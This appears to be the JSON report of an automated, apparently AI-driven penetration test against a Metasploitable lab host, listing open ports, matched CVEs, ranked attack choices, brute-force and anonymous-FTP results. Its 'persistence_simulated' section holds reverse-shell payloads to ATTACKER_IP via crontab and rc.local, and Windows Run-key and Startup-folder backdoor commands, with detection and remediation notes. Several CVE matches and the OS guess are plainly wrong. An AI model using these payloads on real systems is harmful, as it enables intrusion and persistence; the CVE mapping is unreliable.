@@ -1,0 +1,695 @@
+{
+  "target": "192.168.56.102",
+  "recon": {
+    "dns": {
+      "A": [],
+      "MX": [],
+      "NS": [],
+      "TXT": []
+    },
+    "whois": {
+      "registrar": null,
+      "creation_date": null,
+      "expiration_date": null,
+      "emails": "abuse@iana.org",
+      "org": null
+    },
+    "subdomains": [],
+    "shodan": {},
+    "timestamp": "2026-02-20T15:22:22.322802"
+  },
+  "scan_results": {
+    "21": {
+      "service": "ftp",
+      "version": "2.3.4",
+      "banner": "220 (vsFTPd 2.3.4)",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2022-36071",
+          "description": "SFTPGo is configurable SFTP server with optional HTTP/S, FTP/S and WebDAV support. SFTPGo WebAdmin and WebClient support login using TOTP (Time-based One Time Passwords) as a secondary authentication factor. Because TOTPs are often configured on mobile devices that can be lost, stolen or damaged, SF",
+          "cvss_score": 8.3
+        }
+      ]
+    },
+    "22": {
+      "service": "ssh",
+      "version": "4.7p1 Debian 8ubuntu1",
+      "banner": "SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "23": {
+      "service": "telnet",
+      "version": "",
+      "banner": "\\xFF\\xFD\\x18\\xFF\\xFD \\xFF\\xFD#\\xFF\\xFD'",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-1090",
+          "description": "The default configuration of NCSA Telnet package for Macintosh and PC enables FTP, even though it does not include an \"ftp=yes\" line, which allows remote attackers to read and modify arbitrary files.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1098",
+          "description": "Vulnerability in BSD Telnet client with encryption and Kerberos 4 authentication allows remote attackers to decrypt the session via sniffing.",
+          "cvss_score": 5.0
+        },
+        {
+          "cve_id": "CVE-1999-0073",
+          "description": "Telnet allows a remote client to specify environment variables including LD_LIBRARY_PATH, allowing an attacker to bypass the normal system libraries and gain root access.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-1213",
+          "description": "Vulnerability in telnet service in HP-UX 10.30 allows attackers to cause a denial of service.",
+          "cvss_score": 5.0
+        },
+        {
+          "cve_id": "CVE-1999-0192",
+          "description": "Buffer overflow in telnet daemon tgetent routing allows remote attackers to gain root access via the TERMCAP environmental variable.",
+          "cvss_score": 10.0
+        }
+      ]
+    },
+    "25": {
+      "service": "smtp",
+      "version": "",
+      "banner": "220 metasploitable.localdomain ESMTP Postfix (Ubuntu)",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-0203",
+          "description": "In Sendmail, attackers can gain root privileges via SMTP by specifying an improper \"mail from\" address and an invalid \"rcpt to\" address that would cause the mail to bounce to a program.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0250",
+          "description": "Denial of service in Qmail through long SMTP commands.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0284",
+          "description": "Denial of service to NT mail servers including Ipswitch, Mdaemon, and Exchange through a buffer overflow in the SMTP HELO command.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0098",
+          "description": "Buffer overflow in SMTP HELO command in Sendmail allows a remote attacker to hide activities.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-1200",
+          "description": "Vintra SMTP MailServer allows remote attackers to cause a denial of service via a malformed \"EXPN *@\" command.",
+          "cvss_score": 5.0
+        }
+      ]
+    },
+    "53": {
+      "service": "domain",
+      "version": "9.4.2",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "80": {
+      "service": "http",
+      "version": "2.2.8",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2008-2364",
+          "description": "The ap_proxy_http_process_response function in mod_proxy_http.c in the mod_proxy module in the Apache HTTP Server 2.0.63 and 2.2.8 does not limit the number of forwarded interim responses, which allows remote HTTP servers to cause a denial of service (memory consumption) via a large number of interi",
+          "cvss_score": 5.0
+        }
+      ]
+    },
+    "111": {
+      "service": "rpcbind",
+      "version": "2",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2003-1070",
+          "description": "Unknown vulnerability in rpcbind for Solaris 2.6 through 9 allows remote attackers to cause a denial of service (rpcbind crash).",
+          "cvss_score": 5.0
+        }
+      ]
+    },
+    "139": {
+      "service": "netbios-ssn",
+      "version": "3.X - 4.X",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "445": {
+      "service": "netbios-ssn",
+      "version": "3.X - 4.X",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "512": {
+      "service": "exec",
+      "version": "",
+      "banner": "\\x01Where are you?",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-0095",
+          "description": "The debug command in Sendmail is enabled, allowing attackers to execute commands as root.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-1467",
+          "description": "Vulnerability in rcp on SunOS 4.0.x allows remote attackers from trusted hosts to execute arbitrary commands as root, possibly related to the configuration of the nobody user.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-2000-0388",
+          "description": "Buffer overflow in FreeBSD libmytinfo library allows local users to execute commands via a long TERMCAP environmental variable.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1468",
+          "description": "rdist in various UNIX systems uses popen to execute sendmail, which allows local users to gain root privileges by modifying the IFS (Internal Field Separator) variable.",
+          "cvss_score": 6.2
+        },
+        {
+          "cve_id": "CVE-1999-1059",
+          "description": "Vulnerability in rexec daemon (rexecd) in AT&T TCP/IP 4.0 for various SVR4 systems allows remote attackers to execute arbitrary commands.",
+          "cvss_score": 10.0
+        }
+      ]
+    },
+    "513": {
+      "service": "login",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-1034",
+          "description": "Vulnerability in login in AT&T System V Release 4 allows local users to gain privileges.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-1999-1142",
+          "description": "SunOS 4.1.2 and earlier allows local users to gain privileges via \"LD_*\" environmental variables to certain dynamically linked setuid or setgid programs such as (1) login, (2) su, or (3) sendmail, that change the real and effective user ids to the same user.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-1999-1215",
+          "description": "LOGIN.EXE program in Novell Netware 4.0 and 4.01 temporarily writes user name and password information to disk, which could allow local users to gain privileges.",
+          "cvss_score": 4.6
+        },
+        {
+          "cve_id": "CVE-1999-1304",
+          "description": "Vulnerability in login in SCO UNIX 4.2 and earlier allows local users to gain root access.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-1999-0180",
+          "description": "in.rshd allows users to login with a NULL username and execute commands.",
+          "cvss_score": 7.5
+        }
+      ]
+    },
+    "514": {
+      "service": "shell",
+      "version": "",
+      "banner": "\\x01getnameinfo: Temporary failure in name resolution",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-1471",
+          "description": "Buffer overflow in passwd in BSD based operating systems 4.3 and earlier allows local users to gain root privileges by specifying a long shell or GECOS field.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-1999-1115",
+          "description": "Vulnerability in the /etc/suid_exec program in HP Apollo Domain/OS sr10.2 and sr10.3 beta, related to the Korn Shell (ksh).",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-1999-0067",
+          "description": "phf CGI program allows remote command execution through shell metacharacters.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0509",
+          "description": "Perl, sh, csh, or other shell interpreters are installed in the cgi-bin directory on a WWW site, which allows remote attackers to execute arbitrary commands.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-1383",
+          "description": "(1) bash before 1.14.7, and (2) tcsh 6.05 allow local users to gain privileges via directory names that contain shell metacharacters (` back-tick), which can cause the commands enclosed in the directory name to be executed when the shell expands filenames using the \\w option in the PS1 variable.",
+          "cvss_score": 4.6
+        }
+      ]
+    },
+    "1099": {
+      "service": "java-rmi",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "1524": {
+      "service": "bindshell",
+      "version": "",
+      "banner": "root@metasploitable:/#",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "2049": {
+      "service": "nfs",
+      "version": "2-4",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "2121": {
+      "service": "ftp",
+      "version": "1.3.1",
+      "banner": "220 ProFTPD 1.3.1 Server (Debian) [::ffff:192.168.56.102]",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2008-4242",
+          "description": "ProFTPD 1.3.1 interprets long commands from an FTP client as multiple commands, which allows remote attackers to conduct cross-site request forgery (CSRF) attacks and execute arbitrary FTP commands via a long ftp:// URI that leverages an existing session from the FTP client implementation in a web b",
+          "cvss_score": 6.8
+        }
+      ]
+    },
+    "3306": {
+      "service": "mysql",
+      "version": "5.0.51a-3ubuntu5",
+      "banner": ">\\x00\\x00\\x00\\x0A5.0.51a-3ubuntu5\\x00\\x12\\x00\\x00\\x004h4e%&/Y\\x\n00,\\xAA\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\...\n",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "3632": {
+      "service": "distccd",
+      "version": "v1",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "5432": {
+      "service": "postgresql",
+      "version": "8.3.0 - 8.3.7",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "5900": {
+      "service": "vnc",
+      "version": "",
+      "banner": "RFB 003.003",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2001-1422",
+          "description": "WinVNC 3.3.3 and earlier generates the same challenge string for multiple connections, which allows remote attackers to bypass VNC authentication by sniffing the challenge and response of other users.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2002-0971",
+          "description": "Vulnerability in VNC, TightVNC, and TridiaVNC allows local users to execute arbitrary code as LocalSystem by using the Win32 Messaging System to bypass the VNC GUI and access the \"Add new clients\" dialogue box.",
+          "cvss_score": 4.6
+        },
+        {
+          "cve_id": "CVE-2002-0994",
+          "description": "SunPCi II VNC uses a weak authentication scheme, which allows remote attackers to obtain the VNC password by sniffing the random byte challenge, which is used as the key for encrypted communications.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2002-1336",
+          "description": "TightVNC before 1.2.6 generates the same challenge string for multiple connections, which allows remote attackers to bypass VNC authentication by sniffing the challenge and response of other users.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2002-2088",
+          "description": "The MOSIX Project clump/os 5.4 creates a default VNC account without a password, which allows remote attackers to gain root access.",
+          "cvss_score": 10.0
+        }
+      ]
+    },
+    "6000": {
+      "service": "X11",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2000-1169",
+          "description": "OpenSSH SSH client before 2.3.0 does not properly disable X11 or agent forwarding, which could allow a malicious SSH server to gain access to the X11 display and sniff X11 events, or gain access to the ssh-agent.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2002-0402",
+          "description": "Buffer overflow in X11 dissector in Ethereal 0.9.3 and earlier allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code while Ethereal is parsing keysyms.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2002-0517",
+          "description": "Buffer overflow in X11 library (libX11) on Caldera Open UNIX 8.0.0, UnixWare 7.1.1, and possibly other operating systems, allows local users to gain root privileges via a long -xrm argument to programs such as (1) dtterm or (2) xterm.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-2004-0157",
+          "description": "x11.c in xonix 1.4 and earlier uses the current working directory to find and execute the rmail program, which allows local users to execute arbitrary code by modifying the path to point to a malicious rmail program.",
+          "cvss_score": 4.6
+        },
+        {
+          "cve_id": "CVE-2004-2097",
+          "description": "Multiple scripts on SuSE Linux 9.0 allow local users to overwrite arbitrary files via a symlink attack on (1) /tmp/fvwm-bug created by fvwm-bug, (2) /tmp/wmmenu created by wm-oldmenu2new, (3) /tmp/rates created by x11perfcomp, (4) /tmp/xf86debug.1.log created by xf86debug, (5) /tmp/.winpopup-new cre",
+          "cvss_score": 2.1
+        }
+      ]
+    },
+    "6667": {
+      "service": "irc",
+      "version": "",
+      "banner": "ERROR :Closing Link: [192.168.56.1] (Throttled: Reconnecting to\no fast) -Email admin@Metasploitable.LAN for more information.",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-1228",
+          "description": "Various modems that do not implement a guard time, or are configured with a guard time of 0, can allow remote attackers to execute arbitrary modem commands such as ATH, ATH0, etc., via a \"+++\" sequence that appears in ICMP packets, the subject of an e-mail message, IRC commands, and others.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0968",
+          "description": "Buffer overflow in BNC IRC proxy allows remote attackers to gain privileges.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0220",
+          "description": "Attackers can do a denial of service of IRC by crashing the server.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0255",
+          "description": "Buffer overflow in ircd allows arbitrary command execution.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0645",
+          "description": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: None.  Reason: this candidate is solely about a configuration that does not directly introduce security vulnerabilities, so it is more appropriate to cover under the Common Configuration Enumeration (CCE).  Notes: the former description",
+          "cvss_score": 0.0
+        }
+      ]
+    },
+    "6697": {
+      "service": "irc",
+      "version": "",
+      "banner": "ERROR :Closing Link: [192.168.56.1] (Throttled: Reconnecting to\no fast) -Email admin@Metasploitable.LAN for more information.",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-1228",
+          "description": "Various modems that do not implement a guard time, or are configured with a guard time of 0, can allow remote attackers to execute arbitrary modem commands such as ATH, ATH0, etc., via a \"+++\" sequence that appears in ICMP packets, the subject of an e-mail message, IRC commands, and others.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0968",
+          "description": "Buffer overflow in BNC IRC proxy allows remote attackers to gain privileges.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-0220",
+          "description": "Attackers can do a denial of service of IRC by crashing the server.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0255",
+          "description": "Buffer overflow in ircd allows arbitrary command execution.",
+          "cvss_score": 10.0
+        },
+        {
+          "cve_id": "CVE-1999-0645",
+          "description": "Rejected reason: DO NOT USE THIS CANDIDATE NUMBER.  ConsultIDs: None.  Reason: this candidate is solely about a configuration that does not directly introduce security vulnerabilities, so it is more appropriate to cover under the Common Configuration Enumeration (CCE).  Notes: the former description",
+          "cvss_score": 0.0
+        }
+      ]
+    },
+    "8009": {
+      "service": "ajp13",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": []
+    },
+    "8180": {
+      "service": "http",
+      "version": "1.1",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-1999-0071",
+          "description": "Apache httpd cookie buffer overflow for versions 1.1.1 and earlier.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-1999-1072",
+          "description": "Excite for Web Servers (EWS) 1.1 allows local users to gain privileges by obtaining the encrypted password from the world-readable Architext.conf authentication file and replaying the encrypted password in an HTTP request to AT-generated.cgi or AT-admin.cgi.",
+          "cvss_score": 7.2
+        },
+        {
+          "cve_id": "CVE-2000-0561",
+          "description": "Buffer overflow in WebBBS 1.15 allows remote attackers to execute arbitrary commands via a long HTTP GET request.",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2000-1154",
+          "description": "RHConsole in RobinHood 1.1 web server in BeOS r5 pro and earlier allows remote attackers to cause a denial of service via long HTTP request.",
+          "cvss_score": 5.0
+        },
+        {
+          "cve_id": "CVE-2000-1155",
+          "description": "RHDaemon in RobinHood 1.1 web server in BeOS r5 pro and earlier allows remote attackers to cause a denial of service via long HTTP request.",
+          "cvss_score": 5.0
+        }
+      ]
+    },
+    "8787": {
+      "service": "drb",
+      "version": "",
+      "banner": "",
+      "os_guess": "AT&T BGW210 voice gateway",
+      "cves": [
+        {
+          "cve_id": "CVE-2007-5218",
+          "description": "Cross-site scripting (XSS) vulnerability in index.php in Don Barnes DRBGuestbook 1.1.13 allows remote attackers to inject arbitrary web script or HTML via the action parameter.",
+          "cvss_score": 4.3
+        },
+        {
+          "cve_id": "CVE-2015-7945",
+          "description": "The RESTful control interface (aka RAPI or ganeti-rapi) in Ganeti before 2.9.7, 2.10.x before 2.10.8, 2.11.x before 2.11.8, 2.12.x before 2.12.6, 2.13.x before 2.13.3, 2.14.x before 2.14.2, and 2.15.x before 2.15.2 allows remote attackers to obtain the DRBD secret via instance information job result",
+          "cvss_score": 7.5
+        },
+        {
+          "cve_id": "CVE-2017-6284",
+          "description": "NVIDIA Security Engine contains a vulnerability in the Deterministic Random Bit Generator (DRBG) where the DRBG does not properly initialize and store or transmits sensitive data using a weakened encryption scheme that is unable to protect sensitive data which may lead to information disclosure.This",
+          "cvss_score": 5.5
+        },
+        {
+          "cve_id": "CVE-2017-5462",
+          "description": "A flaw in DRBG number generation within the Network Security Services (NSS) library where the internal state V does not correctly carry bits over. The NSS library has been updated to fix this issue to address this issue and Firefox ESR 52.1 has been updated with NSS version 3.28.4. This vulnerabilit",
+          "cvss_score": 5.3
+        },
+        {
+          "cve_id": "CVE-2019-1715",
+          "description": "A vulnerability in the Deterministic Random Bit Generator (DRBG), also known as Pseudorandom Number Generator (PRNG), used in Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to cause a cryptographic co",
+          "cvss_score": 5.3
+        }
+      ]
+    }
+  },
+  "ai_decisions": [
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1203",
+      "target_service": "telnet",
+      "target_port": 23,
+      "rationale": "Multiple high-severity CVEs found for telnet service",
+      "priority": 1
+    },
+    {
+      "technique": "cve_check",
+      "mitre_id": "T1203",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "High-severity CVE found for ftp service",
+      "priority": 2
+    },
+    {
+      "technique": "http_default_creds",
+      "mitre_id": "T1110",
+      "target_service": "http",
+      "target_port": 80,
+      "rationale": "Default credentials may be in use for http service",
+      "priority": 3
+    },
+    {
+      "technique": "ftp_anon",
+      "mitre_id": "T1190",
+      "target_service": "ftp",
+      "target_port": 21,
+      "rationale": "Anonymous ftp access may be enabled",
+      "priority": 4
+    },
+    {
+      "technique": "ssh_brute",
+      "mitre_id": "T1110",
+      "target_service": "ssh",
+      "target_port": 22,
+      "rationale": "Weak passwords may be in use for ssh service",
+      "priority": 5
+    }
+  ],
+  "exploit_results": [
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T14:50:38.080132"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.189231"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T14:50:38.241045"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:15:08.668898"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:09.852048"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:15:11.249871"
+    },
+    {
+      "technique": "http_default_creds",
+      "target": "192.168.56.102",
+      "port": 80,
+      "success": false,
+      "result": "No default creds worked",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.633002"
+    },
+    {
+      "technique": "ftp_anon",
+      "target": "192.168.56.102",
+      "port": 21,
+      "success": true,
+      "result": "Anonymous login OK \u2014 files: ",
+      "mitre_id": "T1078",
+      "timestamp": "2026-02-20T15:24:28.704049"
+    },
+    {
+      "technique": "ssh_brute",
+      "target": "192.168.56.102",
+      "port": 22,
+      "success": false,
+      "result": "No valid credentials found",
+      "mitre_id": "T1110.001",
+      "timestamp": "2026-02-20T15:24:50.012239"
+    }
+  ],
+  "privesc_results": {
+    "message": "No SSH session available. Privesc checks require a valid session.",
+    "suid_binaries": [],
+    "sudo_misconfig": [],
+    "cron_jobs": [],
+    "writable_configs": []
+  },
+  "persistence_simulated": [
+    {
+      "technique": "Cron Job Persistence",
+      "mitre_id": "T1053.003",
+      "simulated": true,
+      "payload_string": "* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+      "target_file": "/etc/crontab",
+      "detection": "Monitor /etc/crontab for unauthorized modifications",
+      "remediation": "Audit cron jobs weekly. Use cron.allow/deny restrictions.",
+      "timestamp": "2026-02-20T09:54:50.080897"
+    },
+    {
+      "technique": "RC.local Startup Script",
+      "mitre_id": "T1037.004",
+      "simulated": true,
+      "payload_string": "#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nexit 0",
+      "target_file": "/etc/rc.local",
+      "detection": "Monitor /etc/rc.local for unauthorized changes; check file integrity with AIDE/Tripwire.",
+      "remediation": "Disable rc.local execution or restrict write access. Use systemd service hardening.",
+      "timestamp": "2026-02-20T09:54:50.080938"
+    },
+    {
+      "technique": "Registry Run Key",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"cmd.exe\"",
+      "target_file": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "detection": "Monitor registry Run/RunOnce keys for new or modified values using Sysmon (Event ID 13).",
+      "remediation": "Restrict registry write access. Deploy endpoint detection (EDR) with Run-key monitoring.",
+      "timestamp": "2026-02-20T09:54:50.080947"
+    },
+    {
+      "technique": "Startup Folder",
+      "mitre_id": "T1547.001",
+      "simulated": true,
+      "payload_string": "copy backdoor.exe \"C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"",
+      "target_file": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+      "detection": "Monitor Startup folder contents for new executables; use Autoruns for auditing.",
+      "remediation": "Restrict write access to Startup folders. Use AppLocker / WDAC to block unsigned executables.",
+      "timestamp": "2026-02-20T09:54:50.080956"
+    }
+  ],
+  "session_info": {
+    "technique": "ftp_anon",
+    "port": 21,
+    "target": "192.168.56.102"
+  },
+  "report_generated": "2026-02-20T15:24:59.032368"
+}
